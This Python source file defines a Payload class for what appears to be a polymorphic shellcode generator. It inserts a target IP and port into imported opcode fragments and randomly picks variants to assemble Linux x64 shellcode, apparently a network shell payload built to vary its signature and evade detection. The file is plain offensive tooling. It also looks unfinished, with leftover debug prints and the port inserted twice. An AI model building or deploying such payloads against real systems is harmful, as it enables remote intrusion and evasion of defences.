from opcodes import permut_list
from random import randint
from utils import *

class Payload:
    def __init__(self,platform,port,ip):
        """
        Payload's constructor method from a platform (Windows/Linux), a port and an ip
        """
        self.shellcode = ""
        self.platform = platform
        self.arch = "x64"
        self.port = port
        self.ip = ip

    def __str__(self):
        """
        Return the ToString of the Payload object
        """
        return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nIP: {self.ip}\nPort: {self.port} \nShellcode:\n{self.shellcode}"

    def permut(self):
        """
        
        """
        print(permut_list[20][0])
        print(permut_list[17][0])

        permut_list[20][0] = permut_list[20][0].replace(r"\x11\x5c", convert_port_to_hex(self.port)) # add port
        permut_list[20][0] += convert_port_to_hex(self.port)
        permut_list[17][0] += get_ip_and_mask(ip_to_hex(self.ip))[0]
        permut_list[18][0] += get_ip_and_mask(ip_to_hex(self.ip))[1]

        print(permut_list[17][0])
        
        if self.platform == "Linux":
            for line in permut_list:
                    self.shellcode += line[randint(0,len(line)-1)]

    def get_bytes_size(self):
        return self.shellcode.count(r"\x")